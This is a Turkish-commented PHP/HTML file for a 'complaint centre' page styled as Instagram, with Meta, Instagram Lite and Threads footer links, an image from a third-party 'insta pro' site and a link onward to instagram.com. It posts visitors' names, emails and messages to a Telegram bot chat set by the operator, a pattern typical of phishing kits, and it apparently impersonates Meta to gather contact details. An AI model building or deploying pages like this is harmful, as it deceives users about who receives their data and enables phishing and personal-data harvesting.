<?php
// index.php

// --- Sunucu tarafı: form gönderimini işle ---
$error = '';
$success = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // TODO: burayı kendi token ve chat id ile değiştir
    $botToken = 'BOT_TOKENINIZ';   // örn: 123:ABC...
    $chatId   = 'CHAT_IDINIZ';     // örn: -123456789

    // Güvenli almak / temizlemek
    $name  = trim($_POST['name']  ?? '');
    $email = trim($_POST['email'] ?? '');
    $msg   = trim($_POST['message'] ?? '');

    if ($name === '' && $email === '' && $msg === '') {
        $error = 'Lütfen en az bir alanı doldurun.';
    } else {
        $telegramMessage = "Yeni Şikayet Mesajı\n\n"
                         . "İsim: $name\n"
                         . "E-posta: $email\n\n"
                         . "Mesaj:\n$msg";

        $url = "https://api.telegram.org/bot$botToken/sendMessage";
        $data = [
            'chat_id' => $chatId,
            'text'    => $telegramMessage
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);

        $response = curl_exec($ch);
        $curlErr  = curl_error($ch);
        curl_close($ch);

        if ($response === false || $curlErr) {
            $error = "Mesaj gönderilemedi. Sunucu hatası: $curlErr";
        } else {
            // Telegram API başarılıysa response JSON döner; burada basitçe başarılı kabul ediyoruz
            $success = true;
            // (Güvenlik) gönderim sonrası istersen form verilerini temizle
            $name = $email = $msg = '';
        }
    }
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Şikayet / İletişim</title>
  <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css"/>
  <style>
    /* Küçük ek stiller — asıl stilini /style.css içeriğini koruyabilirsin */
    .notice { padding: 12px; margin-bottom: 12px; border-radius: 8px; }
    .notice.success { background:#e6ffef; color:#0b7a44; border:1px solid #b7f0c9; }
    .notice.error   { background:#ffecec; color:#7a0b0b; border:1px solid #f0b7b7; }
  </style>
</head>
<body>
  <div class="wrapper">
    <div>
      <img src="https://instaproapp.tools/wp-content/uploads/2025/07/insta-pro.png" alt="Ana görsel" class="main-image">
    </div>

    <div class="login-container">
      <h1 class="logo">Şikayet Merkezi</h1>

      <?php if ($success): ?>
        <div class="notice success">Teşekkürler — şikayetiniz alındı. En kısa sürede incelenecektir.</div>
      <?php elseif ($error !== ''): ?>
        <div class="notice error"><?= htmlspecialchars($error) ?></div>
      <?php endif; ?>

      <form action="" method="POST" autocomplete="off">
        <input name="name" type="text" placeholder="İsim (opsiyonel)" value="<?= isset($name) ? htmlspecialchars($name) : '' ?>">
        <input name="email" type="email" placeholder="E-posta (opsiyonel)" value="<?= isset($email) ? htmlspecialchars($email) : '' ?>">
        <textarea name="message" placeholder="Mesajınız / şikayetiniz" style="width:100%; padding:10px; margin:8px 0; border-radius:12px; border:1px solid #dbdbdb; min-height:100px; font-size:14px; resize:vertical;"><?= isset($msg) ? htmlspecialchars($msg) : '' ?></textarea>

        <button type="submit">Gönder</button>
      </form>

      <div class="divider"><span>YA DA</span></div>

      <button class="facebook-login" type="button" onclick="window.location.href='https://www.instagram.com'">
        © Resmi Kaynaklar & Yardım
      </button>

      <a href="#" class="forgot-password">Yardım & Sıkça Sorulanlar</a>

      <div class="signup">
        Şikayetlerinizi buradan iletebilirsiniz.
      </div>
    </div>
  </div>

  <footer class="site-footer">
   <div class="footer-links">
    <a href="#">Meta</a>
    <a href="#">Hakkında</a>
    <a href="#">Blog</a>
    <a href="#">İş Fırsatları</a>
    <a href="#">Yardım</a>
    <a href="#">API</a>
    <a href="#">Gizlilik</a>
    <a href="#">Koşullar</a>
    <a href="#">Konumlar</a>
    <a href="#">Instagram Lite</a>
    <a href="#">Meta AI</a>
    <a href="#">Threads</a>
   </div>
   <div class="footer-bottom">
    <div class="language-select">
      Türkçe <span class="dropdown-arrow">▼</span>
    </div>
    <div class="copyright">© 2025 Şikayet Merkezi</div>
   </div>
 </footer>
</body>
</html>
